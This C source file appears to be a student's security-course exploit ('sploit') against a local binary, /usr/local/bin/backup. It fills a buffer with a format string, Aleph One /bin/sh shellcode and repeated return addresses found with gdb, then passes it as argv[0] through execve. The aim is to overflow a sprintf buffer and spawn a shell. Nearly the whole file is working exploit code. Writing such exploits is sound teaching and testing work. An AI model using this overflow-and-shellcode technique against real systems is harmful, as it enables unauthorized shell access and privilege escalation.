/*
 * Author: Lawson Fulton
 * Student#: 20381453
 * ID: ljfulton
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>


#define TARGET "/usr/local/bin/backup"
#define NOP 0x90
#define BUFF_SIZE 60
#define SHELLCODE_SIZE 45

 /*
 * Aleph One shellcode.
 */
static char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh"; //45 bytes not including null terminator

int main(void)
{
  char *args[2];
  char *env[1];

  /* Build the exploit string */
  char buffer[BUFF_SIZE];
  unsigned int buffer_addr = 0xffbfdd08; /* Address of char buffer[104] in backup.c:127 found with gdb */

  char fmat_str[] = "%44d"; /*String that will expand inside sprintf backup.c:133 */
  int i, fmat_str_size = sizeof(fmat_str) - 1;

  unsigned int shellcode_addr = buffer_addr + 15 + fmat_str_size; //+15 for string already in buffer

  /*Copy the format string (which will expand to overflow output) into the buffer */
  memcpy(buffer, fmat_str, fmat_str_size);
  /*Copy the shellcode into the buffer*/
  memcpy(buffer + fmat_str_size, shellcode, SHELLCODE_SIZE);

  /* Repeat the address of the shellcode to fill the rest of the buffer */
  for(i = 0 ; i < BUFF_SIZE - (fmat_str_size + SHELLCODE_SIZE); i++) {
    *(((int*)(buffer + fmat_str_size + SHELLCODE_SIZE)) + i) = shellcode_addr;
  }

  
  /* Pass the buffer in instead of the program name as args[0] */
  args[0] = buffer;
  args[1] = NULL;
  env[0] = NULL;

  fprintf(stderr, "Running sploit...\n");
  if (execve(TARGET, args, env) < 0)
    fprintf(stderr, "execve failed.\n");

  exit(0);
}
